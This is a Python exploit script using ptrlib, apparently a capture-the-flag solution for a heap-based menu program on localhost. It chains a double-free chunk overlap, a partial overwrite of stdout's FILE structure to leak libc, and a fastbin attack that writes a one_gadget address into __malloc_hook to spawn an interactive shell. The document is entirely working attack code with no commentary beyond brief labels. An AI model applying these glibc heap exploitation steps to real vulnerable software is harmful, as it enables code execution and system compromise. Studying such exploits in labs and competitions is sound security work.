from ptrlib import *

def create(size, index, name, newline=True):
    nl = "\n" if newline else ""
    sock.sendlineafter(">> "+nl, "1")
    sock.sendlineafter("weapon: ", str(size))
    sock.sendlineafter("index: ", str(index))
    sock.sendafter("name:"+nl, name)
    return

def delete(index, newline=True):
    nl = "\n" if newline else ""
    sock.sendlineafter(">> "+nl, "2")
    sock.sendlineafter("idx :", str(index))
    return

def rename(index, name):
    sock.sendlineafter(">> \n", "3")
    sock.sendlineafter("idx: ", str(index))
    sock.sendafter("content:\n", name)
    return

libc = ELF("./libc.so.6")
sock = Socket("localhost", 9999)
one_gadget = 0xf1147

# chunk overlap
create(0x18, 0, "chunk 0") # 0x00
create(0x18, 1, "chunk 1") # 0x20
fake_chunk_1 = p64(0) + p64(0x21)  # target (0x21 to bypass size check)
fake_chunk_2 = b"A" * 0x30
fake_chunk_2 += p64(0) + p64(0x31) # target + 0x90
fake_chunk_3 = b"B" * 0x10         # target + 0xb0
create(0x58, 2, fake_chunk_1) # 0x40 (fake_chunk_1: 0x50)
create(0x60, 3, fake_chunk_2) # 0xa0 (fake_chunk_2: 0xb0)
create(0x60, 4, fake_chunk_3) # 0x100 (fake_chunk_3: 0x110)
delete(0)
delete(1)
delete(0)
create(0x18, 0, b'\x50') # fd --> fake_chunk
create(0x18, 0, p64(0))
create(0x18, 0, b'A')
create(0x18, 0, b'target')
rename(2, p64(0) + p64(0x91))
delete(0)

# libc leak
create(0x60, 0, b"\xdd\x25")
create(0x60, 8, b"chunk 4")
create(0x60, 9, b"chunk 5")

delete(4)
delete(3)
delete(4)
create(0x60, 0, b"\x50")
create(0x60, 4, p64(0))
create(0x60, 5, b'A')
create(0x60, 0, b'target')

fake_file = b'A' * 0x33
fake_file += p64(0xfbad1800)
fake_file += p64(0) * 3
fake_file += b'\x88'
create(0x60, 1, fake_file)

libc_base = u64(sock.recv(8)) - libc.symbol("_IO_2_1_stdin_")
logger.info("libc base = " + hex(libc_base))

# fastbin attack
delete(8, newline=False)
delete(9, newline=False)
delete(8, newline=False)
create(0x60, 0, p64(libc_base + libc.symbol("__malloc_hook") - 0x23), newline=False)
create(0x60, 4, p64(0), newline=False)
create(0x60, 5, b'A', newline=False)
payload = b'A' * 0x13
payload += p64(libc_base + one_gadget)
create(0x60, 0, payload, newline=False)

sock.interactive()
